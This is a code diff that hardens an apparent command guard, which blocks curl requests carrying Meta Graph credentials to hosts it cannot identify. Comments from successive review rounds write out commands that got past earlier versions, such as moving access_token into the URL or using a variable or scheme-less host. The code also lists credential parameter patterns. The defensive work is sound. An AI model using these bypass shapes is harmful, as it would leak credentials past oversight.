+  if (VERSION_SEGMENT_RE.test(pathPartRaw)) return true;
+
+  const pathPart = decodeOnceForCompare(pathPartRaw);
+  if (pathPart === null) return true; // malformed escape → classify → fail closed
+  if (VERSION_SEGMENT_RE.test(pathPart)) return true;
+
+  // Split AFTER decoding, so an encoded separator (%2F) yields real segments.
+  const segs = pathPart.split('/').filter(Boolean).map((x) => x.toLowerCase());
+  if (segs.length === 0) return false;
+  const joined = segs.join('/');
+
+  // NOTE on `/me` (round 10, F4): treating it as Graph-shaped unconditionally
+  // was tried and reverted. It denied an ordinary `https://$SVC/me?fields=id`
+  // that carries no credential and is not a Graph request — caught by this
+  // suite's own control. Classification for that case keys on the CREDENTIAL
+  // instead, in isMetaGraphCommand(), which is both narrower and the actual
+  // hazard: `/me` without a token can do nothing at Graph.
+
+  if (protectedRootPaths().has(joined)) return true; // oauth/access_token, device/login, debug_token …
+  // /{id}/messages, /{id}/subscribed_apps, /{id}/accounts, /{id}/request_code …
+  if (segs.length >= 2 && protectedEdges().has(segs[segs.length - 1])) return true;
+
+  return false;
+}
+
+/**
+ * Parameter and header shapes that carry a Meta credential.
+ *
+ * Round 10, F4: classification of an indeterminate target depended entirely on
+ * the PATH looking Graph-shaped. `/me` is Graph's canonical self node and is not
+ * a version segment, a protected root or a protected edge — so
+ * `https://$HOST/me?fields=accounts{access_token}` reached Graph with a
+ * credential while `isMetaGraphCommand()` returned false and the policy was
+ * never entered. Every downstream rule would have refused it instantly.
+ *
+ * These are credential-bearing PARAMETER and HEADER names, matched on the wire
+ * shape of the request. No variable NAME is ever inspected — a name carries no
+ * provenance, and `$X` is not safer than `$META_GRAPH_TOKEN`.
+ */
+const CREDENTIAL_PARAM_KEYS = new Set([
+  'access_token',
+  'input_token',
+  'client_secret',
+  'appsecret_proof',
+  'code_verifier',
+  'fb_exchange_token',
+  'client_code',
+]);
+const BEARER_HEADER_RE = /authorization\s*:\s*bearer\b/i;
+
+/** Does this command carry a Meta credential on the wire? */
+function carriesCredential(cmd, params) {
+  for (const p of params || []) {
+    if (p && typeof p.key === 'string' && CREDENTIAL_PARAM_KEYS.has(p.key.trim().toLowerCase())) return true;
+  }
+  return BEARER_HEADER_RE.test(String(cmd || ''));
+}
+
+/**
+ * A `fields` value that asks for credential material or walks a token-minting
+ * edge is itself proof this is a Meta request, whatever the path spells.
+ */
+function fieldsRequestCredential(params) {
+  for (const p of params || []) {
+    if (!p || String(p.key || '').trim().toLowerCase() !== 'fields') continue;
+    const decoded = safeDecode(String(p.value || ''));
+    if (FORBIDDEN_FIELD_RE.test(decoded)) return true;
+    for (const name of allFieldNames(String(p.value || ''))) {
+      if (TOKEN_MINTING_EDGES.has(String(name).toLowerCase())) return true;
+    }
+  }
+  return false;
+}
+
+/** True when any parameter key is one the policy already treats as an exchange. */
+function hasTokenExchangeParam(params) {
+  for (const p of params || []) {
+    if (!p || typeof p.key !== 'string') continue;
+    if (TOKEN_EXCHANGE_PARAMS.has(p.key.trim().toLowerCase())) return true;
+  }
+  return false;
+}
+
+/**
+ * Query parameters carried by the operands a curl invocation will ACTUALLY
+ * contact — the same authoritative representation round 10 introduced for F1.
+ *
+ * Round 11, P0-A: credential classification of an indeterminate authority was
+ * fed from `collectDataParams()` alone, which reads flag-supplied parameters.
+ * The operand's own query string was never merged in, so the identical
+ * credential moved from a flag into the URL escaped classification entirely:
+ *
+ *   curl -sG "https://$HOST/me" --data-urlencode "access_token=$T"  -> denied
+ *   curl -sG "https://$HOST/me?access_token=$T"                     -> ALLOWED
+ *
+ * A FRAGMENT is not a query. `…/subscribed_apps#access_token=x` sends nothing
+ * after the `#`, and treating it as a parameter would refuse a request that
+ * carries no credential at all — the mirror image of the bug being fixed.
+ */
+function operandQueryParams(cmd) {
+  const out = [];
+  const { invocations } = analyzeRequestTargets(cmd);
+  for (const inv of invocations) {
+    if (inv.client !== 'curl') continue;
+    for (const e of inv.targets) {
+      const q = splitTarget(String(e.raw || '')).query;
+      if (!q) continue;
+      const frag = q.indexOf('#');
+      for (const p of splitQuery(frag === -1 ? q : q.slice(0, frag))) out.push(p);
+    }
+  }
+  return out;
+}
+
+/**
+ * Every parameter this request will carry, from BOTH sources, in order and with
+ * repeats preserved — a benign first occurrence must never vouch for a later
+ * credential occurrence. Keys arrive percent-decoded from splitQuery(), so
+ * `access%5Ftoken` is the same carrier as `access_token`.
+ */
+function requestParams(cmd) {
+  return [...operandQueryParams(cmd), ...collectDataParams(cmd)];
+}
+
+/**
+ * Is the destination of this authoritative operand decidable before it runs?
+ *
+ * Round 11, P0-B: indeterminacy was detected by `splitUrls()`, which anchors on
+ * a LITERAL `http://` or `https://`. An operand whose scheme is variable-composed
+ * or absent therefore never produced an indeterminate authority — it was treated
+ * as "not a URL" and left the policy, credential and all:
+ *
+ *   curl -sG "${SCHEME}://${HOST}/me" --data-urlencode "access_token=$T"
+ *   curl -sG "$HOST/me"               --data-urlencode "access_token=$T"
+ *
+ * curl contacts something in both cases; what it contacts is simply unknown. An
+ * absent scheme is also not benign — curl defaults it to plaintext HTTP.
+ *
+ * Sanctioned Meta access requires a literal scheme AND a literal authority. This
+ * reports only decidability; whether indeterminacy MATTERS is the caller's
+ * question, and the caller requires a credential or a Graph-shaped operation
+ * before refusing anything. Ordinary variable-host curl stays unaffected.
+ */
+function targetDestinationIsIndeterminate(raw) {
+  const s = String(raw || '').trim();
+  if (s === '') return false;
+  const t = splitTarget(s);
+  // A scheme that is absent, partially literal or wholly expanded is not a
+  // decided scheme. Only a complete literal scheme token counts.
+  if (!/^[A-Za-z][A-Za-z0-9+.\-]*$/.test(t.scheme)) return true;
+  if (t.authority === '') return true;
+  return EXPANSION_MARKER_RE.test(t.authority);
+}
+
+/** The authoritative operands whose destination cannot be decided. */
+function indeterminateTargets(cmd) {
+  const out = [];
+  const { invocations } = analyzeRequestTargets(cmd);
+  for (const inv of invocations) {
+    if (inv.client !== 'curl') continue;
+    for (const e of inv.targets) {
+      const raw = String(e.raw || '');
+      if (targetDestinationIsIndeterminate(raw)) out.push(raw);
+    }
+  }
+  return out;
+}
+
 function isMetaGraphCommand(cmd) {
-  return META_HOST_RE.test(String(cmd || ''));
+  const s = String(cmd || '');
+  if (META_HOST_RE.test(s)) return true;
+
+  // The literal host is absent. That alone used to end classification, which
+  // left a hole: `curl "https://$HOST/oauth/access_token"` — with HOST exported
+  // in an earlier turn, so the name never appears in THIS command — skipped the
+  // Meta policy entirely and reached a credential-minting endpoint. The
+  // VARIABLE_HOST_RE defence in evaluateMetaGraph() could not fire, because
+  // evaluateMetaGraph() was never entered.
+  //
+  // Classify on the PATH instead when it is unmistakably Graph-shaped. The
+  // request is then denied as unclassifiable, which is the correct outcome: an
+  // endpoint that cannot be identified cannot be allowlisted.
+  // Shared request-target analysis. Wrapped: a parsing fault inside the guard
+  // must fail CLOSED for a request-shaped command, never escape to the outer
+  // fail-open handler and let an unexamined request through.
+  try {
+    if (targetsResistDecision(s)) return true;
+  } catch (_) {
+    if (REQUEST_CLIENT_RE.test(s)) return true;
+  }
+
+  let sawIndeterminateAuthority = false;
+  for (const u of splitUrls(s)) {
+    if (!authorityIsIndeterminate(u.authority)) continue;
+    sawIndeterminateAuthority = true;
+    if (isGraphShapedPath(u.rest || '')) return true;
+  }
+
+  // Round 11, P0-B. The scan above needs a literal scheme to find a URL at all,
+  // so a variable-composed or absent scheme hid the authority from it. Ask the
+  // authoritative operands directly. A parsing fault here must fail CLOSED: the
+  // command is request-shaped, and an unreadable destination is exactly the
+  // condition this branch exists to refuse.
+  try {
+    for (const raw of indeterminateTargets(s)) {
+      sawIndeterminateAuthority = true;
+      const t = splitTarget(raw);
+      if (isGraphShapedPath((t.path || '') + (t.query ? '?' + t.query : ''))) return true;
+    }
+  } catch (_) {
+    return true;
+  }
+
+  if (!sawIndeterminateAuthority) return false;
+
+  // The path can be a variable too, so its shape proves nothing:
+  //   curl -sG "https://$HOST/$EDGE" --data-urlencode "client_secret=$VALUE"
+  // Nothing here is literal except the PARAMETER, and a client_secret exchange
+  // is a Graph operation whatever the path spells. Reuse the same curl parser
+  // the rest of the policy uses, so flag-supplied query parameters
+  // (-G --data-urlencode, --url-query, -d, --json …) are seen exactly as
+  // classifyFields() sees them, and cannot disagree about what a cluster meant.
+  //
+  // Round 11, P0-A: the operand's OWN query joins them. One request has one
+  // parameter set, and the two places it can be written must not disagree about
+  // whether it carries a credential. A parsing fault fails CLOSED, for the same
+  // reason as above.
+  let params;
+  try {
+    params = requestParams(s);
+  } catch (_) {
+    return true;
+  }
+  if (hasTokenExchangeParam(params)) return true;
+
+  // A credential on the wire, going somewhere that cannot be identified before
+  // the command runs, is a Meta request until proven otherwise. Classify it so
+  // the policy can refuse it, rather than letting an unreadable destination be
+  // its own excuse.
+  if (carriesCredential(s, params)) return true;
+
+  // A fields value asking for credential material or a token-minting edge is
+  // proof of intent regardless of what the path spells.
+  if (fieldsRequestCredential(params)) return true;
+
+  // A file-sourced parameter set (`--data-urlencode "@params.txt"`) makes the
+  // effective query unknowable. Combined with an authority that is already
+  // indeterminate, nothing about this request can be verified before it runs,
+  // so it must be classified and denied rather than waved through.
+  if (params.some((p) => p && p.opaque)) return true;
+
+  return false;
 }
 
 // ---------------------------------------------------------------- 1. tokenize
@@ -160,13 +1226,11 @@ const SHORT_DATA_LETTERS = new Set(['d', 'F', 'T']);
 
 /** curl flags that take no value and cannot introduce a body or change method. */
 const SAFE_CURL_BOOLEAN_FLAGS = new Set([
+  '-q', '--disable',
   '-s', '--silent',
   '-S', '--show-error',
-  '-v', '--verbose',
   '-i', '--include',
   '-I', '--head',
-  '-L', '--location',
-  '-k', '--insecure',
   '-f', '--fail',
   '--fail-with-body',
   '--compressed',
@@ -180,7 +1244,6 @@ const SAFE_CURL_BOOLEAN_FLAGS = new Set([
 const SAFE_CURL_VALUE_FLAGS = new Set([
   '-H', '--header',
   '-o', '--output',
-  '-w', '--write-out',
   '-A', '--user-agent',
   '-e', '--referer',
   '--url',
@@ -190,12 +1253,11 @@ const SAFE_CURL_VALUE_FLAGS = new Set([
   '--connect-timeout', '--max-time', '-m',
   '--retry', '--retry-delay', '--retry-max-time',
   '--max-redirs',
-  '--resolve',
 ]);
 
 /** Short-cluster letters, split by whether they consume a value. */
-const SHORT_BOOLEAN_LETTERS = new Set(['s', 'S', 'v', 'i', 'I', 'L', 'k', 'f', 'g', 'G', '4', '6']);
-const SHORT_VALUE_LETTERS = new Set(['H', 'o', 'w', 'A', 'e', 'X', 'd', 'm']);
+const SHORT_BOOLEAN_LETTERS = new Set(['q', 's', 'S', 'i', 'I', 'f', 'g', 'G', '4', '6']);
+const SHORT_VALUE_LETTERS = new Set(['H', 'o', 'A', 'e', 'X', 'd', 'm']);
 
 /**
  * A data value curl reads FROM A FILE rather than from the command line:
@@ -245,7 +1307,25 @@ const VALUE_TAKING = new Set([
  * `ok` is false when the command is not a plain curl invocation.
  */
 function parseCurlArgs(cmd) {
-  const tokens = tokenize(cmd);
+  return parseCurlTokens(tokenize(cmd));
+}
+
+/**
+ * The same parser, over an already-tokenised argv whose first element is the
+ * curl executable.
+ *
+ * Split out in round 8 so destination counting can run the AUTHORITATIVE parse
+ * after a wrapper has been resolved, instead of a second heuristic scan. Round 7
+ * counted destinations with a `looksLikeTarget()` guess that required `://`, an
+ * expansion marker or a slash — so a scheme-less operand (`attacker.example`,
+ * `host:8443`, a bare IPv4, `localhost`) was discarded, and a curl carrying the
+ * Meta credential to a second host looked single-destination.
+ *
+ * curl's grammar is the only correct rule: options consume their values, and
+ * EVERYTHING that remains is a URL operand. No hostname, IP or domain syntax is
+ * enumerated anywhere, because curl does not enumerate it either.
+ */
+function parseCurlTokens(tokens) {
   const opts = [];
   const operands = [];
   const unknown = [];
@@ -260,10 +1340,21 @@ function parseCurlArgs(cmd) {
     i++;
   }
 
+  // `--` is STATEFUL: it ends option parsing. Everything after it is an
+  // operand, including tokens that begin with a dash.
+  let endOfOptions = false;
+
   for (; i < tokens.length; i++) {
     const t = tokens[i];
 
-    if (t === '--') continue;
+    if (endOfOptions) {
+      operands.push(t);
+      continue;
+    }
+    if (t === '--') {
+      endOfOptions = true;
+      continue;
+    }
 
     if (/^--[a-z]/i.test(t)) {
       const eq = t.indexOf('=');
@@ -622,9 +1713,22 @@ function splitQuery(qs) {
   for (const pair of String(qs || '').split('&')) {
     if (!pair) continue;
     const eq = pair.indexOf('=');
-    const key = eq === -1 ? pair : pair.slice(0, eq);
-    const value = eq === -1 ? '' : pair.slice(eq + 1);
-    params.push({ key: safeDecode(key.trim()), value });
+    if (eq !== -1) {
+      params.push({ key: safeDecode(pair.slice(0, eq).trim()), value: pair.slice(eq + 1) });
+      continue;
+    }
+    // No '='. curl's file-backed forms live here, and reading the whole string
+    // as the key is what let `client_secret@params.txt` miss TOKEN_EXCHANGE_PARAMS.
+    //   name@file  -> a NAMED parameter whose value is read from a file
+    //   @file      -> an entirely file-sourced parameter set: opaque
+    const at = pair.indexOf('@');
+    if (at > 0) {
+      params.push({ key: safeDecode(pair.slice(0, at).trim()), value: pair.slice(at), fileSourced: true });
+    } else if (at === 0) {
+      params.push({ key: '', value: pair, fileSourced: true, opaque: true });
+    } else {
+      params.push({ key: safeDecode(pair.trim()), value: '' });
+    }
   }
   return params;
 }
@@ -634,8 +1738,63 @@ function splitQuery(qs) {
  * Returns [{raw, version, segments, params}], segments being the path AFTER an
  * optional /vNN.N/ version prefix.
  */
+/**
+ * Parse ONE already-tokenised target into the Graph URL shape.
+ *
+ * Round 10, F1: `GRAPH_URL_RE` excludes `&` from its character class, because in
+ * raw command text an unquoted `&` separates commands. But inside a QUOTED curl
+ * operand it is an ordinary query separator — so the scan stopped at the first
+ * `&` and everything after it became invisible to `classifyFields()` and the
+ * credential-field rule. `?metadata=0&fields=access_token` was read as
+ * `?metadata=0`, and a request that asks Graph to return a credential in the
+ * response body was allowed.
+ *
+ * Operating on a token removes the ambiguity entirely: the tokenizer has already
+ * resolved quoting, so no shell metacharacter needs to terminate anything.
+ */
+function parseGraphUrlToken(raw) {
+  const s = String(raw == null ? '' : raw);
+  const afterHost = s.replace(/^(?:https?:\/\/)?[^/?#]*graph\.facebook\.com/i, '');
+  const qIdx = afterHost.indexOf('?');
+  const pathPart = qIdx === -1 ? afterHost : afterHost.slice(0, qIdx);
+  const queryPart = qIdx === -1 ? '' : afterHost.slice(qIdx + 1);
+
+  const segments = pathPart.split('/').filter(Boolean);
+  let version = null;
+  if (segments.length && /^v\d+\.\d+$/i.test(segments[0])) version = segments.shift();
+
+  return { raw: s, version, segments, params: splitQuery(queryPart) };
+}
+
+/** The Graph targets a curl invocation will actually contact, as tokens. */
+function authoritativeGraphTargets(cmd) {
+  const out = [];
+  try {
+    const { invocations } = analyzeRequestTargets(cmd);
+    for (const inv of invocations) {
+      if (inv.client !== 'curl') continue;
+      for (const e of inv.targets) {
+        if (META_HOST_RE.test(String(e.raw || ''))) out.push(String(e.raw));
+      }
+    }
+  } catch (_) {
+    return [];
+  }
+  return out;
+}
+
 function parseGraphUrls(cmd) {
   const src = String(cmd || '');
+
+  // Authoritative path: for a curl invocation, parse the operand curl will
+  // actually contact. The complete query is inspected, every parameter,
+  // repeats included — not a substring that stops at a metacharacter.
+  const authoritative = authoritativeGraphTargets(src);
+  if (authoritative.length) return authoritative.map(parseGraphUrlToken);
+
+  // Fallback for non-curl clients (wget, httpie, interpreters), whose grammars
+  // this extractor does not model. Their own rules refuse them; this only keeps
+  // endpoint detail available to those rules.
   const out = [];
   const re = new RegExp(GRAPH_URL_RE.source, 'gi');
   let m;
@@ -1008,29 +2167,41 @@ function classifyEndpoint(url, params) {
 
 /** Validate the `fields` parameter of an otherwise-allowlisted read. */
 function classifyFields(params) {
-  const raw = paramValue(params, 'fields');
-  if (raw == null || raw === '') return { ok: true, fields: [] };
+  // EVERY occurrence, not just the first. Round 10, F1: `paramValue()` returns
+  // the first match, so `fields=id,name&fields=access_token` was validated on
+  // the benign one and the credential request behind it was never examined.
+  // curl sends both; the policy must read both.
+  const occurrences = (params || [])
+    .filter((p) => p && String(p.key || '').trim().toLowerCase() === 'fields')
+    .map((p) => p.value)
+    .filter((v) => v != null && v !== '');
 
-  const decoded = safeDecode(raw);
-  if (FORBIDDEN_FIELD_RE.test(decoded)) {
-    return {
-      ok: false,
-      ruleId: 'credential-field',
-      reason: 'The `fields` parameter requests credential material (' + decoded.match(FORBIDDEN_FIELD_RE)[0] + ').',
-    };
-  }
+  if (occurrences.length === 0) return { ok: true, fields: [] };
 
-  // Checked at EVERY depth, not just top level — see allFieldNames().
-  const fields = allFieldNames(raw);
-  const bad = fields.filter((f) => !ALLOWED_NODE_FIELDS.has(f.toLowerCase()));
-  if (bad.length) {
-    return {
-      ok: false,
-      ruleId: 'unapproved-field',
-      reason: 'Field(s) not on the metadata allowlist: ' + bad.join(', ') + '.',
-    };
+  const all = [];
+  for (const raw of occurrences) {
+    const decoded = safeDecode(raw);
+    if (FORBIDDEN_FIELD_RE.test(decoded)) {
+      return {
+        ok: false,
+        ruleId: 'credential-field',
+        reason: 'The `fields` parameter requests credential material (' + decoded.match(FORBIDDEN_FIELD_RE)[0] + ').',
+      };
+    }
+
+    // Checked at EVERY depth, not just top level — see allFieldNames().
+    const fields = allFieldNames(raw);
+    const bad = fields.filter((f) => !ALLOWED_NODE_FIELDS.has(f.toLowerCase()));
+    if (bad.length) {
+      return {
+        ok: false,
+        ruleId: 'unapproved-field',
+        reason: 'Field(s) not on the metadata allowlist: ' + bad.join(', ') + '.',
+      };
+    }
+    all.push(...fields);
   }
-  return { ok: true, fields };
+  return { ok: true, fields: all };
 }
 
 // ---------------------------------------------------------------- 5. credentials
@@ -1269,6 +2440,79 @@ function evaluateMetaGraph(cmd) {
     );
   }
 
+  // The SAME analysis classification used. Sharing it is the point: a target
+  // that was classified because it resists decision must also be denied here,
+  // rather than falling through to per-URL rules that need a literal URL to
+  // examine and would find none.
+  let resists = false;
+  try {
+    resists = targetsResistDecision(whole);
+  } catch (_) {
+    resists = true; // an inspection fault on a request-shaped command fails closed
+  }
+  // Same-command client shadowing. First, because if the client has been
+  // rebound then nothing below describes the request that actually runs.
+  let shadow = null;
+  try {
+    shadow = shellShadowViolation(whole);
+  } catch (_) {
+    shadow = {
+      reason: 'This command could not be inspected for request-client rebinding.',
+      remedy: REMEDY_LITERAL_URL,
+    };
+  }
+  if (shadow) return unclassifiable(shadow.reason, shadow.remedy);
+
+  // Hygiene required of a Meta request specifically. Scoped here so ordinary
+  // non-Meta curl usage elsewhere in the repo is unaffected.
+  let hygiene = null;
+  try {
+    hygiene = metaCurlHygieneViolation(whole);
+  } catch (_) {
+    hygiene = {
+      reason: 'This Meta request could not be inspected for configuration and header hygiene.',
+      remedy: REMEDY_LITERAL_URL,
+    };
+  }
+  if (hygiene) return unclassifiable(hygiene.reason, hygiene.remedy);
+
+  // Single-destination contract. Deliberately BEFORE splitTransfers(), which
+  // keeps only the Graph transfers — exactly the information this rule needs.
+  let multiDest = null;
+  try {
+    multiDest = singleDestinationViolation(whole);
+  } catch (_) {
+    multiDest = {
+      reason: 'The set of destinations this curl would contact could not be determined.',
+      remedy: REMEDY_LITERAL_URL,
+    };
+  }
+  if (multiDest) return unclassifiable(multiDest.reason, multiDest.remedy);
+
+  // Target identity, from the operand curl will actually contact. Runs before
+  // any path/field/credential rule, because those rules answer "is this Graph
+  // request acceptable" and are meaningless until "is this a Graph request at
+  // all" has been settled from the destination rather than from stray text.
+  let identity = null;
+  try {
+    identity = metaTargetIdentityViolation(whole);
+  } catch (_) {
+    identity = {
+      reason: 'The destination this command would contact could not be identified.',
+      remedy: REMEDY_LITERAL_URL,
+    };
+  }
+  if (identity) return unclassifiable(identity.reason, identity.remedy);
+
+  if (resists) {
+    return unclassifiable(
+      'The request target cannot be decided before this command runs: its scheme, authority, path, protected edge, ' +
+        'query-key provenance or configuration source is supplied at runtime. A destination that cannot be identified ' +
+        'cannot be allowlisted, and a Meta mutation is indistinguishable from an ordinary request until it has already happened.',
+      REMEDY_LITERAL_URL
+    );
+  }
+
   // A variable used in the URL is only acceptable as a bare asset id. If this
   // command also assigns a variable to something containing URL structure, the
   // "id" can expand into an extra path segment or query — turning an allowlisted
@@ -1284,13 +2528,30 @@ function evaluateMetaGraph(cmd) {
   const segments = splitTransfers(whole);
   const parsedAnywhere = segments.some((s) => parseGraphUrls(s).length > 0);
 
+  // Round 11, P0-B. The gate below required a LITERAL `http(s)://` before it
+  // would refuse an unclassifiable Meta request. An operand whose scheme is
+  // absent or variable-composed offers no literal scheme to find, so the least
+  // decidable requests of all took the "nothing to gate" exit and were allowed —
+  // even carrying a credential, which is what classified them in the first
+  // place. Ask the authoritative operands whether the destination is decidable.
+  // An inspection fault counts as indeterminate: this branch is reached only for
+  // a command already classified as Meta.
+  let indeterminate;
+  try {
+    indeterminate = indeterminateTargets(whole).length > 0;
+  } catch (_) {
+    indeterminate = true;
+  }
+
   if (!parsedAnywhere) {
     // The host is named but no Graph URL could be parsed. Prose, a grep, or a
     // string literal in a script — nothing to gate — UNLESS the command really
     // is issuing a request, in which case refusing is the only honest answer.
-    if (/https?:\/\//i.test(whole) && REQUEST_CLIENT_RE.test(whole)) {
+    if (REQUEST_CLIENT_RE.test(whole) && (/https?:\/\//i.test(whole) || indeterminate)) {
       return unclassifiable(
-        'This command issues a Meta Graph request whose URL cannot be statically classified.',
+        'This command issues a Meta Graph request whose URL cannot be statically classified. ' +
+          'Sanctioned Meta access requires a literal https scheme and the exact approved Graph ' +
+          'authority, both readable before the command runs.',
         REMEDY_LITERAL_URL
       );
     }
